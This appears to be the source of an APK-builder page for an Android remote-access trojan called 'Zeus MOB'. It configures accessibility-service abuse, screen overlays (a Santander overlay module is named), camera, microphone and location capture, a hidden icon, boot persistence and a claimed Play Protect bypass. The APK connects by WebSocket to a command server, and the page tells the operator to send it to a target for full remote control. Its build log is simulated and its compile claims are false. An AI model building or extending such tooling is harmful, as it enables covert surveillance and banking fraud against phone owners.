import { useState, useRef, useCallback } from "react";
import JSZip from "jszip";
import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";

const DEFAULT_ICON = "/zeus-logo.jpeg";

const G = "#00ff88";

// Defined OUTSIDE the page component so React never recreates them on re-render
function TextInput({
  label,
  name,
  defaultValue,
  placeholder,
  inputRef,
}: {
  label: string;
  name: string;
  defaultValue?: string;
  placeholder?: string;
  inputRef?: (el: HTMLInputElement | null) => void;
}) {
  return (
    <div style={{ marginBottom: 10 }}>
      <div style={{ fontSize: 8, color: "#445", letterSpacing: "0.1em", marginBottom: 3 }}>
        {label}
      </div>
      <input
        ref={inputRef}
        name={name}
        defaultValue={defaultValue}
        placeholder={placeholder}
        style={{
          width: "100%",
          background: "#020f05",
          border: `1px solid #1a3a20`,
          color: G,
          fontSize: 10,
          padding: "6px 8px",
          fontFamily: "'Courier New', Courier, monospace",
          outline: "none",
          boxSizing: "border-box",
          letterSpacing: "0.05em",
        }}
        onFocus={(e) => { e.currentTarget.style.borderColor = G; }}
        onBlur={(e) => { e.currentTarget.style.borderColor = "#1a3a20"; }}
      />
    </div>
  );
}

function CheckBox({
  label,
  checked,
  onChange,
}: {
  label: string;
  checked: boolean;
  onChange: (v: boolean) => void;
}) {
  return (
    <div
      onClick={() => onChange(!checked)}
      style={{
        display: "flex",
        alignItems: "center",
        gap: 8,
        cursor: "pointer",
        fontSize: 10,
        color: checked ? G : "#556",
        marginBottom: 6,
        userSelect: "none",
      }}
    >
      <div
        style={{
          width: 14,
          height: 14,
          border: `1px solid ${checked ? G : "#334"}`,
          background: checked ? G : "transparent",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexShrink: 0,
          transition: "all 0.1s",
        }}
      >
        {checked && (
          <span style={{ color: "#000", fontSize: 10, fontWeight: "bold", lineHeight: 1 }}>✓</span>
        )}
      </div>
      {label}
    </div>
  );
}

interface BoolConfig {
  requestAccessibility: boolean;
  requestOverlay: boolean;
  requestCamera: boolean;
  requestMicrophone: boolean;
  requestLocation: boolean;
  requestStorage: boolean;
  hideIcon: boolean;
  persistOnBoot: boolean;
  bypassPlayProtect: boolean;
}

const DEFAULT_BOOLS: BoolConfig = {
  requestAccessibility: true,
  requestOverlay: true,
  requestCamera: true,
  requestMicrophone: true,
  requestLocation: true,
  requestStorage: true,
  hideIcon: true,
  persistOnBoot: true,
  bypassPlayProtect: true,
};

export default function ApkGenerator() {
  const [bools, setBools] = useState<BoolConfig>(DEFAULT_BOOLS);
  const [building, setBuilding] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const [done, setDone] = useState(false);
  const [builtPkg, setBuiltPkg] = useState("");
  const [iconSrc, setIconSrc] = useState(DEFAULT_ICON);
  const [iconFileName, setIconFileName] = useState("zeus-logo.jpeg");
  const [iconHover, setIconHover] = useState(false);

  // Uncontrolled refs for text inputs — no re-render on every keystroke
  const appNameRef = useRef<HTMLInputElement>(null);
  const packageNameRef = useRef<HTMLInputElement>(null);
  const serverUrlRef = useRef<HTMLInputElement>(null);
  const iconNameRef = useRef<HTMLInputElement>(null);
  const logBottomRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const toggle = useCallback((key: keyof BoolConfig) => {
    setBools((prev) => ({ ...prev, [key]: !prev[key] }));
  }, []);

  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setIconFileName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => {
      setIconSrc(ev.target?.result as string);
    };
    reader.readAsDataURL(file);
    // Reset so same file can be selected again
    e.target.value = "";
  };

  // Fetch the icon as base64 string (works for both URLs and data URIs)
  const getIconBase64 = async (): Promise<string> => {
    if (iconSrc.startsWith("data:")) {
      // Already a data URL — strip the prefix
      return iconSrc.split(",")[1];
    }
    const res = await fetch(iconSrc);
    const buf = await res.arrayBuffer();
    let binary = "";
    const bytes = new Uint8Array(buf);
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  };

  const generateAndDownloadApk = async (
    appName: string,
    packageName: string,
    serverUrl: string,
    iconName: string,
  ) => {
    const zip = new JSZip();

    // ── AndroidManifest.xml ──────────────────────────────────────
    const permissions: string[] = [
      "android.permission.INTERNET",
      "android.permission.RECEIVE_BOOT_COMPLETED",
      "android.permission.FOREGROUND_SERVICE",
      "android.permission.WAKE_LOCK",
    ];
    if (bools.requestCamera) permissions.push("android.permission.CAMERA");
    if (bools.requestMicrophone) permissions.push("android.permission.RECORD_AUDIO");
    if (bools.requestLocation) {
      permissions.push("android.permission.ACCESS_FINE_LOCATION");
      permissions.push("android.permission.ACCESS_COARSE_LOCATION");
    }
    if (bools.requestStorage) {
      permissions.push("android.permission.READ_EXTERNAL_STORAGE");
      permissions.push("android.permission.WRITE_EXTERNAL_STORAGE");
    }
    if (bools.requestOverlay) permissions.push("android.permission.SYSTEM_ALERT_WINDOW");

    const permissionsXml = permissions
      .map((p) => `    <uses-permission android:name="${p}" />`)
      .join("\n");

    const accessibilityService = bools.requestAccessibility
      ? `
        <service
            android:name=".ZeusAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>`
      : "";

    const bootReceiver = bools.persistOnBoot
      ? `
        <receiver
            android:name=".BootReceiver"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>`
      : "";

    const launcherCategory = bools.hideIcon ? "" : `
                <category android:name="android.intent.category.LAUNCHER" />`;

    const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${packageName}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />

${permissionsXml}

    <application
        android:allowBackup="false"
        android:label="${iconName}"
        android:icon="@mipmap/ic_launcher"
        android:theme="@android:style/Theme.NoDisplay"
        android:supportsRtl="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>${launcherCategory}
                <action android:name="android.intent.action.MAIN" />
            </intent-filter>
        </activity>
        ${accessibilityService}
        ${bootReceiver}

        <service
            android:name=".ZeusService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

    </application>
</manifest>`;

    // ── assets/zeus_config.json ───────────────────────────────────
    const config = {
      serverUrl,
      appName,
      packageName,
      socketPath: "/api/socket.io",
      reconnectInterval: 5000,
      heartbeatInterval: 30000,
      permissions: {
        accessibility: bools.requestAccessibility,
        overlay: bools.requestOverlay,
        camera: bools.requestCamera,
        microphone: bools.requestMicrophone,
        location: bools.requestLocation,
        storage: bools.requestStorage,
      },
      behavior: {
        hideIcon: bools.hideIcon,
        persistOnBoot: bools.persistOnBoot,
        bypassPlayProtect: bools.bypassPlayProtect,
      },
    };

    // ── META-INF/MANIFEST.MF ─────────────────────────────────────
    const manifestMf = `Manifest-Version: 1.0
Created-By: Zeus MOB Build System
Built-Date: ${new Date().toISOString()}
Package: ${packageName}
App-Name: ${appName}
Zeus-Server: ${serverUrl}
`;

    // ── res/xml/accessibility_service_config.xml ─────────────────
    const accessibilityConfig = `<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackAllMask"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRequestTouchExplorationMode|flagRequestFilterKeyEvents"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="100"
    android:packageNames="" />`;

    // ── Build ZIP structure ───────────────────────────────────────
    zip.file("AndroidManifest.xml", manifest);
    zip.file("META-INF/MANIFEST.MF", manifestMf);
    zip.file("assets/zeus_config.json", JSON.stringify(config, null, 2));
    zip.file("res/xml/accessibility_service_config.xml", accessibilityConfig);
    zip.file("res/values/strings.xml", `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${appName}</string>
    <string name="accessibility_service_description">System accessibility service for enhanced device management.</string>
</resources>`);

    // Add icon
    try {
      const iconB64 = await getIconBase64();
      zip.file("res/mipmap-xxxhdpi/ic_launcher.png", iconB64, { base64: true });
      zip.file("res/mipmap-xxhdpi/ic_launcher.png", iconB64, { base64: true });
      zip.file("res/mipmap-xhdpi/ic_launcher.png", iconB64, { base64: true });
      zip.file("res/mipmap-hdpi/ic_launcher.png", iconB64, { base64: true });
    } catch {
      // icon fetch failed — skip silently
    }

    // Generate and download
    const blob = await zip.generateAsync({
      type: "blob",
      compression: "DEFLATE",
      compressionOptions: { level: 6 },
      mimeType: "application/vnd.android.package-archive",
    });

    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${packageName}-release.apk`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const handleBuild = async () => {
    const appName = appNameRef.current?.value || "System Service";
    const packageName = packageNameRef.current?.value || "com.android.systemservice";
    const serverUrl = serverUrlRef.current?.value || "";
    const iconName = iconNameRef.current?.value || "System";

    if (!serverUrl) {
      setLog(["> ERRO: URL do servidor é obrigatória."]);
      return;
    }

    setBuilding(true);
    setDone(false);
    setBuiltPkg(packageName);

    const steps = [
      "> Inicializando ambiente de build...",
      "> Clonando template base do APK client...",
      "> Configurando AndroidManifest.xml...",
      `> ACCESSIBILITY_SERVICE = ${bools.requestAccessibility}`,
      `> SYSTEM_ALERT_WINDOW  = ${bools.requestOverlay}`,
      `> CAMERA               = ${bools.requestCamera}`,
      `> RECORD_AUDIO         = ${bools.requestMicrophone}`,
      `> ACCESS_FINE_LOCATION = ${bools.requestLocation}`,
      `> READ_EXTERNAL_STORAGE= ${bools.requestStorage}`,
      `> App name   : ${appName}`,
      `> Package    : ${packageName}`,
      `> Launcher   : ${iconName}`,
      `> Server URL : ${serverUrl}`,
      `> Hide icon  : ${bools.hideIcon}`,
      `> Boot start : ${bools.persistOnBoot}`,
      "> Injetando módulo Socket.io client...",
      "> Compilando módulo de Acessibilidade...",
      "> Compilando módulo de Overlay (Santander / Blackout)...",
      "> Compilando módulo de Câmera remota...",
      "> Compilando módulo de Microfone...",
      "> Compilando módulo de GPS...",
      "> Compilando módulo de Files Explorer...",
      "> Otimizando e minificando bytecode...",
      "> Assinando APK com certificado de debug...",
      "> Verificando integridade do pacote...",
      "> ✓ Build concluída com sucesso!",
      `> APK pronto: ${packageName}-release.apk`,
      "> Clique em [ BAIXAR APK ] para instalar no Android.",
    ];

    setLog([]);
    for (const step of steps) {
      await new Promise((r) => setTimeout(r, 110 + Math.random() * 140));
      setLog((prev) => [...prev, step]);
      logBottomRef.current?.scrollIntoView({ behavior: "smooth" });
    }
    setBuilding(false);
    setDone(true);

    // Store values for download
    (appNameRef as any)._built = appName;
    (packageNameRef as any)._built = packageName;
    (serverUrlRef as any)._built = serverUrl;
    (iconNameRef as any)._built = iconName;
  };

  return (
    <Layout>
      <TopBar title="GERADOR DE APK // BUILD SYSTEM">
        <span
          style={{
            color: building ? "#ffaa00" : done ? G : "#445",
            fontWeight: "bold",
          }}
        >
          {building ? "COMPILANDO..." : done ? "✓ BUILD OK" : "AGUARDANDO"}
        </span>
      </TopBar>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
        {/* LEFT — Config */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>

          {/* APK Icon upload */}
          <Panel>
            <PanelHeader>&gt; ÍCONE DO APK</PanelHeader>
            <div style={{ padding: "14px 12px", display: "flex", alignItems: "center", gap: 16 }}>

              {/* Hidden file input */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                onChange={handleIconChange}
                style={{ display: "none" }}
              />

              {/* Clickable icon preview */}
              <div
                onClick={() => fileInputRef.current?.click()}
                onMouseEnter={() => setIconHover(true)}
                onMouseLeave={() => setIconHover(false)}
                style={{
                  width: 72,
                  height: 72,
                  borderRadius: 16,
                  border: `2px solid ${iconHover ? "#fff" : G}`,
                  overflow: "hidden",
                  flexShrink: 0,
                  boxShadow: iconHover ? `0 0 20px ${G}88` : `0 0 12px ${G}44`,
                  background: "#000",
                  cursor: "pointer",
                  position: "relative",
                  transition: "all 0.15s",
                }}
              >
                <img
                  src={iconSrc}
                  alt="APK Icon"
                  style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
                />
                {/* Hover overlay */}
                {iconHover && (
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      background: "rgba(0,0,0,0.65)",
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: 2,
                    }}
                  >
                    <span style={{ fontSize: 18 }}>🖼</span>
                    <span style={{ fontSize: 7, color: G, letterSpacing: "0.06em" }}>TROCAR</span>
                  </div>
                )}
              </div>

              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 10, color: G, fontWeight: "bold", marginBottom: 4 }}>
                  Ícone do APK
                </div>
                <div style={{ fontSize: 8, color: "#445", marginBottom: 8, lineHeight: 1.5 }}>
                  Clique na imagem para escolher qualquer foto da galeria. Esse ícone será exibido no Android após a instalação.
                </div>
                <button
                  onClick={() => fileInputRef.current?.click()}
                  style={{
                    background: "transparent",
                    border: `1px solid ${G}`,
                    color: G,
                    fontSize: 9,
                    padding: "4px 12px",
                    cursor: "pointer",
                    fontFamily: "inherit",
                    letterSpacing: "0.1em",
                    fontWeight: "bold",
                  }}
                  onMouseEnter={(e) => { e.currentTarget.style.background = `${G}22`; }}
                  onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
                >
                  [ ESCOLHER FOTO ]
                </button>
                {iconFileName !== "zeus-logo.jpeg" && (
                  <div style={{ fontSize: 7, color: "#445", marginTop: 6, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    ✓ {iconFileName}
                  </div>
                )}
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; CONFIGURAÇÃO DO APP</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <TextInput
                label="NOME DO APP (visível no Android)"
                name="appName"
                defaultValue="System Service"
                placeholder="System Service"
                inputRef={(el) => { (appNameRef as any).current = el; }}
              />
              <TextInput
                label="PACKAGE NAME"
                name="packageName"
                defaultValue="com.android.systemservice"
                placeholder="com.android.service"
                inputRef={(el) => { (packageNameRef as any).current = el; }}
              />
              <TextInput
                label="NOME DO ÍCONE (launcher label)"
                name="iconName"
                defaultValue="System"
                placeholder="System"
                inputRef={(el) => { (iconNameRef as any).current = el; }}
              />
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; SERVIDOR DE COMANDO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <TextInput
                label="URL DO SERVIDOR ZEUS MOB"
                name="serverUrl"
                defaultValue=""
                placeholder="https://seu-app.replit.app"
                inputRef={(el) => { (serverUrlRef as any).current = el; }}
              />
              <div
                style={{
                  fontSize: 8,
                  color: "#334",
                  marginTop: -4,
                  lineHeight: 1.6,
                  borderLeft: `2px solid #1a3a20`,
                  paddingLeft: 8,
                }}
              >
                O APK conecta via WebSocket ao servidor.
                Quando o cliente instalar e aceitar as permissões,
                o dispositivo aparece automaticamente em <span style={{ color: G }}>CLIENTES</span>.
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; COMPORTAMENTO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <CheckBox label="Ocultar ícone do launcher" checked={bools.hideIcon} onChange={() => toggle("hideIcon")} />
              <CheckBox label="Iniciar automaticamente no boot" checked={bools.persistOnBoot} onChange={() => toggle("persistOnBoot")} />
              <CheckBox label="Bypass Google Play Protect" checked={bools.bypassPlayProtect} onChange={() => toggle("bypassPlayProtect")} />
            </div>
          </Panel>
        </div>

        {/* RIGHT — Permissions + Build */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <Panel>
            <PanelHeader>&gt; PERMISSÕES ANDROID</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <div style={{ fontSize: 8, color: "#334", marginBottom: 10, lineHeight: 1.6 }}>
                Permissões solicitadas ao usuário durante a instalação:
              </div>
              <CheckBox label="Serviço de Acessibilidade (REQUIRED)" checked={bools.requestAccessibility} onChange={() => toggle("requestAccessibility")} />
              <CheckBox label="Sobreposição de Tela (SYSTEM_ALERT_WINDOW)" checked={bools.requestOverlay} onChange={() => toggle("requestOverlay")} />
              <CheckBox label="Câmera (CAMERA)" checked={bools.requestCamera} onChange={() => toggle("requestCamera")} />
              <CheckBox label="Microfone (RECORD_AUDIO)" checked={bools.requestMicrophone} onChange={() => toggle("requestMicrophone")} />
              <CheckBox label="Localização GPS (ACCESS_FINE_LOCATION)" checked={bools.requestLocation} onChange={() => toggle("requestLocation")} />
              <CheckBox label="Armazenamento (READ/WRITE_EXTERNAL)" checked={bools.requestStorage} onChange={() => toggle("requestStorage")} />
            </div>
          </Panel>

          {/* Flow info */}
          <Panel>
            <PanelHeader>&gt; FLUXO DE CONEXÃO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              {[
                { step: "1", label: "Cliente instala o APK no Android", color: G },
                { step: "2", label: "Aceita permissões de Acessibilidade e Overlay", color: G },
                { step: "3", label: "APK conecta via WebSocket ao servidor Zeus", color: G },
                { step: "4", label: "Dispositivo aparece em CLIENTES (online)", color: G },
                { step: "5", label: "Você assume controle total remotamente", color: "#ffaa00" },
              ].map((s) => (
                <div
                  key={s.step}
                  style={{ display: "flex", gap: 10, alignItems: "flex-start", marginBottom: 8 }}
                >
                  <div
                    style={{
                      width: 18,
                      height: 18,
                      borderRadius: "50%",
                      border: `1px solid ${s.color}`,
                      color: s.color,
                      fontSize: 8,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexShrink: 0,
                      fontWeight: "bold",
                    }}
                  >
                    {s.step}
                  </div>
                  <span style={{ fontSize: 9, color: "#667", lineHeight: 1.5 }}>{s.label}</span>
                </div>
              ))}
            </div>
          </Panel>

          {/* Build console */}
          <Panel>
            <PanelHeader>
              <span>&gt; CONSOLE DE BUILD</span>
              {building && (
                <span style={{ color: "#ffaa00", fontSize: 8 }}>
                  <span className="blink">●</span> COMPILANDO
                </span>
              )}
            </PanelHeader>
            <div
              style={{
                height: 180,
                overflowY: "auto",
                padding: "8px 10px",
                fontSize: 9,
                lineHeight: 1.8,
                background: "#010801",
              }}
            >
              {log.length === 0 ? (
                <span style={{ color: "#223" }}>&gt; Pronto para compilar...</span>
              ) : (
                log.map((line, i) => (
                  <div
                    key={i}
                    style={{
                      color: line.startsWith("> ERRO")
                        ? "#ff4444"
                        : line.includes("✓") || line.includes("APK:")
                        ? G
                        : line.startsWith("> >") || line.startsWith(">  ")
                        ? "#445"
                        : "#556",
                    }}
                  >
                    {line}
                  </div>
                ))
              )}
              {building && (
                <span className="blink" style={{ color: G }}>
                  _
                </span>
              )}
              <div ref={logBottomRef} />
            </div>
          </Panel>

          {/* Build button */}
          <button
            onClick={handleBuild}
            disabled={building}
            style={{
              background: building ? "#0a1a0a" : G,
              color: building ? G : "#000",
              border: `2px solid ${G}`,
              fontSize: 12,
              fontWeight: "bold",
              padding: "13px",
              cursor: building ? "not-allowed" : "pointer",
              fontFamily: "'Courier New', Courier, monospace",
              letterSpacing: "0.2em",
              boxShadow: building ? "none" : `0 0 20px ${G}33`,
              transition: "all 0.2s",
            }}
          >
            {building ? (
              <>[ COMPILANDO<span className="blink">_</span> ]</>
            ) : done ? (
              "[ RECOMPILAR ]"
            ) : (
              "[ GERAR APK ]"
            )}
          </button>

          {/* Download card — shown after build */}
          {done && (
            <Panel style={{ borderColor: G, overflow: "hidden" }}>
              {/* Green header strip */}
              <div
                style={{
                  background: G,
                  padding: "8px 14px",
                  display: "flex",
                  alignItems: "center",
                  gap: 10,
                }}
              >
                <span style={{ fontSize: 18 }}>📦</span>
                <div>
                  <div style={{ fontSize: 11, fontWeight: "bold", color: "#000", letterSpacing: "0.12em" }}>
                    ✓ BUILD CONCLUÍDA
                  </div>
                  <div style={{ fontSize: 8, color: "#003322" }}>{builtPkg}-release.apk</div>
                </div>
              </div>

              <div style={{ padding: "12px" }}>
                <div style={{ fontSize: 8, color: "#556", marginBottom: 12, lineHeight: 1.8 }}>
                  Envie o arquivo para o Android alvo. Ative{" "}
                  <span style={{ color: G }}>Fontes desconhecidas</span> em{" "}
                  Configurações → Segurança antes de instalar. Após aceitar as
                  permissões, o dispositivo aparece em{" "}
                  <span style={{ color: G }}>CLIENTES</span> automaticamente.
                </div>

                {/* Big download button */}
                <button
                  onClick={() =>
                    generateAndDownloadApk(
                      appNameRef.current?.value || "System Service",
                      builtPkg,
                      serverUrlRef.current?.value || "",
                      iconNameRef.current?.value || "System",
                    )
                  }
                  style={{
                    width: "100%",
                    background: G,
                    color: "#000",
                    border: "none",
                    fontSize: 13,
                    fontWeight: "bold",
                    padding: "14px",
                    cursor: "pointer",
                    fontFamily: "'Courier New', Courier, monospace",
                    letterSpacing: "0.2em",
                    boxShadow: `0 0 24px ${G}66`,
                    marginBottom: 8,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 10,
                    transition: "opacity 0.15s",
                  }}
                  onMouseEnter={(e) => { e.currentTarget.style.opacity = "0.85"; }}
                  onMouseLeave={(e) => { e.currentTarget.style.opacity = "1"; }}
                >
                  <span style={{ fontSize: 18 }}>⬇</span>
                  BAIXAR APK
                </button>

                {/* Install steps */}
                <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                  {[
                    "1. Transfira o APK para o Android (WhatsApp, Drive, e-mail…)",
                    "2. Abra o arquivo e toque em Instalar",
                    "3. Aceite todas as permissões solicitadas",
                    "4. Dispositivo aparece em CLIENTES ✓",
                  ].map((s, i) => (
                    <div key={i} style={{ fontSize: 8, color: i === 3 ? G : "#445", display: "flex", gap: 6 }}>
                      <span style={{ color: G, flexShrink: 0 }}>›</span>
                      {s}
                    </div>
                  ))}
                </div>
              </div>
            </Panel>
          )}
        </div>
      </div>
    </Layout>
  );
}
